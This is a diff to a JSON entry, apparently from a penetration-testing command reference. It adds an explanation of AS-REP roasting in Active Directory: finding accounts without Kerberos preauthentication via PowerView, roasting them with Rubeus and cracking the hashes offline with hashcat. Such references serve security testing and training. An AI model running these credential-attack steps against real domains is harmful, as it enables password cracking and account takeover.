@@ -108,5 +108,6 @@
       "label": "Crack offline",
       "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
     }
-  ]
+  ],
+  "explain": "Finds AS-REP roastable accounts with PowerView:\n  Get-DomainUser -PreauthNotRequired   users with 'Do not require Kerberos preauth' set (UAC 4194304)\n  | select samaccountname,userprincipalname,useraccountcontrol   confirm the targets\nTheir AS-REP is encrypted with the account's NT hash and can be requested without creds - roast with Rubeus asreproast and crack offline (hashcat -m 18200)."
 }
